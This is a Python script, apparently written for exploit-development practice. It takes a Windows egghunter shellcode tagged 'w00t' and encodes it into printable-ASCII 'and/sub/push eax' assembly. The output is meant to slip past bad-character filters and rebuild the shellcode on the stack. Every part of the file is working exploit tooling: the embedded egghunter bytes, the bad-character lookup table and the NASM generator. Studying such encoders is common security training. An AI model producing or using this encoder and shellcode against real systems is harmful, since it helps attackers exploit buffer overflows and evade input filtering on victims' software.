import struct

################# User code begin ###################################################################
# You should edit only this section

egghunter = "\x31\xd2\x90\x90\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
egghunter += "w00t" # this is the marker/tag: w00t
egghunter += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

# Make sure that finally using variable "shellcode"
shellcode = egghunter
################# User code end #####################################################################

reg1 = 0
reg2 = 0
reg3 = 0

def check(two_bytes):
    global reg1,reg2,reg3

    # Following way is not good :-(  want better solution...
    # check if using bad characters
    # 0x7e or 0x7f or 0x80  "*" 0x2a
    if(two_bytes == 0x7e):
        reg1 = 0x28
        reg2 = 0x29
        reg3 = 0x2d
    if(two_bytes == 0x7f):
        reg1 = 0x29
        reg2 = 0x29
        reg3 = 0x2d
    if(two_bytes == 0x80):
        reg1 = 0x29
        reg2 = 0x29
        reg3 = 0x2e
    # 0x82 or 0x83 or 0x84 or 0x85 or 0x86  "," 0x2c
    if(two_bytes == 0x82):
        reg1 = 0x29
        reg2 = 0x2b
        reg3 = 0x2e
    if(two_bytes == 0x83):
        reg1 = 0x2b
        reg2 = 0x2b
        reg3 = 0x2d
    if(two_bytes == 0x84):
        reg1 = 0x2b
        reg2 = 0x2b
        reg3 = 0x2e
    if(two_bytes == 0x85):
        reg1 = 0x29
        reg2 = 0x29
        reg3 = 0x33
    if(two_bytes == 0x86):
        reg1 = 0x29
        reg2 = 0x29
        reg3 = 0x34
    # 0x8b or 0x8c or 0x8d or 0x8e or 0x8f  "/" 0x2f
    if(two_bytes == 0x8b):
        reg1 = 0x27
        reg2 = 0x31
        reg3 = 0x33
    if(two_bytes == 0x8c):
        reg1 = 0x28
        reg2 = 0x31
        reg3 = 0x33
    if(two_bytes == 0x8d):
        reg1 = 0x29
        reg2 = 0x31
        reg3 = 0x33
    if(two_bytes == 0x8e):
        reg1 = 0x29
        reg2 = 0x32
        reg3 = 0x33
    if(two_bytes == 0x8f):
        reg1 = 0x29
        reg2 = 0x33
        reg3 = 0x33
    # 0xac or 0xad or 0xae or 0xaf or 0xb0  ":" 0x3a
    if(two_bytes == 0xac):
        reg1 = 0x2b
        reg2 = 0x40
        reg3 = 0x41
    if(two_bytes == 0xad):
        reg1 = 0x2d
        reg2 = 0x40
        reg3 = 0x40
    if(two_bytes == 0xae):
        reg1 = 0x2e
        reg2 = 0x40
        reg3 = 0x40
    if(two_bytes == 0xaf):
        reg1 = 0x2e
        reg2 = 0x41
        reg3 = 0x40
    if(two_bytes == 0xb0):
        reg1 = 0x2e
        reg2 = 0x41
        reg3 = 0x41
    # 0xb1 or 0xb2 or 0xb3  ";"  0x3b
    if(two_bytes == 0xb1):
        reg1 = 0x2e
        reg2 = 0x41
        reg3 = 0x42
    if(two_bytes == 0xb2):
        reg1 = 0x2e
        reg2 = 0x42
        reg3 = 0x42
    if(two_bytes == 0xb3):
        reg1 = 0x2e
        reg2 = 0x42
        reg3 = 0x43
    # 0xb4 or 0xb5 or 0xb6  "<" 0x3c
    if(two_bytes == 0xb4):
        reg1 = 0x2e
        reg2 = 0x43
        reg3 = 0x43
    if(two_bytes == 0xb5):
        reg1 = 0x2e
        reg2 = 0x43
        reg3 = 0x44
    if(two_bytes == 0xb6):
        reg1 = 0x2e
        reg2 = 0x44
        reg3 = 0x44
    # 0xb8 or 0xb9 or 0xba or 0xbb or 0xbc  ">" 0x3e
    if(two_bytes == 0xb8):
        reg1 = 0x2e
        reg2 = 0x45
        reg3 = 0x45
    if(two_bytes == 0xb9):
        reg1 = 0x2e
        reg2 = 0x45
        reg3 = 0x46
    if(two_bytes == 0xba):
        reg1 = 0x2e
        reg2 = 0x46
        reg3 = 0x46
    if(two_bytes == 0xbb):
        reg1 = 0x2e
        reg2 = 0x46
        reg3 = 0x47
    if(two_bytes == 0xbc):
        reg1 = 0x2e
        reg2 = 0x47
        reg3 = 0x47
    # 0xbd or 0xbe or 0xbf  "?" 0x3f
    if(two_bytes == 0xbd):
        reg1 = 0x2e
        reg2 = 0x47
        reg3 = 0x48
    if(two_bytes == 0xbe):
        reg1 = 0x2e
        reg2 = 0x48
        reg3 = 0x48
    if(two_bytes == 0xbf):
        reg1 = 0x2e
        reg2 = 0x48
        reg3 = 0x49
    # 0x112 or 0x113 or 0x114 or 0x115 or 0x116  "\" 0x5c
    if(two_bytes == 0x112):
        reg1 = 0x58
        reg2 = 0x59
        reg3 = 0x61
    if(two_bytes == 0x113):
        reg1 = 0x58
        reg2 = 0x5a
        reg3 = 0x61
    if(two_bytes == 0x114):
        reg1 = 0x59
        reg2 = 0x5a
        reg3 = 0x61
    if(two_bytes == 0x115):
        reg1 = 0x5a
        reg2 = 0x5a
        reg3 = 0x61
    if(two_bytes == 0x116):
        reg1 = 0x5a
        reg2 = 0x5a
        reg3 = 0x62
    # 0x172 or 0x173 or 0x174 or 0x175 or 0x176  "|" 0x7c
    if(two_bytes == 0x172):
        reg1 = 0x78
        reg2 = 0x7d
        reg3 = 0x7d
    if(two_bytes == 0x173):
        reg1 = 0x79
        reg2 = 0x7d
        reg3 = 0x7d
    if(two_bytes == 0x174):
        reg1 = 0x7a
        reg2 = 0x7d
        reg3 = 0x7d
    if(two_bytes == 0x175):
        reg1 = 0x7b
        reg2 = 0x7d
        reg3 = 0x7d
    if(two_bytes == 0x176):
        reg1 = 0x7b
        reg2 = 0x7d
        reg3 = 0x7e


def encoder(eax):
    global reg1,reg2,reg3
    countup = 0
    out1 = 0
    out2 = 0
    out3 = 0
    for i in range(4):
        # get 2bytes from input
        two_bytes = hex((eax >> i*8) & 0xff)
        two_bytes = int(two_bytes,0)
        # consider carry up in previous 2bytes
        two_bytes = two_bytes - countup

        # in case -1 -> 0xff
        two_bytes = int(hex(two_bytes & 0xff),0)
        #print("two_bytes " + str(hex(two_bytes)))
        # if this range, needs carry up
        if(int(0x00) <= two_bytes and two_bytes <= int(0x7d)):
            two_bytes = two_bytes + 0x100
            reg1 = two_bytes / 3
            reg2 = reg1
            reg3 = reg1 + two_bytes % 3
            # want to max(reg3 - reg2) == 1
            if(two_bytes % 3 == 2):
                reg2 = reg1 + 1
                reg3 = reg2

            # check if contain bad charater
            check(two_bytes)

            countup = 1
            out1 += reg1 << i*8
            out2 += reg2 << i*8
            out3 += reg3 << i*8
            print("; [+] " +str(i) + ": " + str(hex(reg1)) + " " + str(hex(reg2)) + " " + str(hex(reg3)))
        # if this range, don't need to carry up
        else:
            reg1 = two_bytes / 3
            reg2 = reg1
            reg3 = reg1 + two_bytes % 3
            # want to max(reg3 - reg2) == 1
            if(two_bytes % 3 == 2):
                reg2 = reg1 + 1
                reg3 = reg2

            # check if contain bad character
            check(two_bytes)

            # if 0x55*3+previou_carryup == 0x100, countup
            if(two_bytes + countup >= 0x100):
                countup = 1
            else:
                countup = 0

            out1 += reg1 << i*8
            out2 += reg2 << i*8
            out3 += reg3 << i*8
            print("; [+] " + str(i) + ": " + str(hex(reg1)) + " " + str(hex(reg2)) + " " + str(hex(reg3)))
    # print output you can use within ASCII code 0x26-0x7f
    #print("[+] " + str(hex(out1)) )
    #print("[+] " + str(hex(out2)) )
    #print("[+] " + str(hex(out3)) )
    if( ((out1 + out2 + out3) & 0xffffffff ) != eax ):
        print("; [-] encode faild!!")
        exit(0)
    print("")
    print("; [+] Example")
    print("; [+] init eax ----------------------------------------------")
    #print("     25 4a 4d 4e 4e          and    eax,0x4e4e4d4a")
    #print("     25 35 32 31 31          and    eax,0x31313235")
    print("                             and    eax,0x4e4e4d4a")
    print("                             and    eax,0x31313235")
    print("; [+] sub and set eax----------------------------------------")
    print("                             sub    eax," + str(hex(out1)) )
    print("                             sub    eax," + str(hex(out2)) )
    print("                             sub    eax," + str(hex(out3)) )
    print("; [+] push eax-----------------------------------------------")
    #print("     50                      push eax")
    print("                             push eax")
    print("")


def genshellcode(raw):

    for i in range(len(raw)/4):

        last4 = raw[-4:]
        raw = raw[:-4]
        eax = int(hex(struct.unpack('<I',last4)[0]),0)
        print("; last4bytes :" + str(hex(eax)) )

        eax = eax*-1
        eax = int(hex(eax & 0xffffffff),0)
        print("; 2's complement :" + str(hex(eax)) )
        encoder(eax)

    print("; [*] encode successfully finished!!")

# We want to reuse this output to nasm.asm :-)
print("global _start")
print("")
print("section .text")
print("")
print("_start:")
print("")

genshellcode(shellcode)
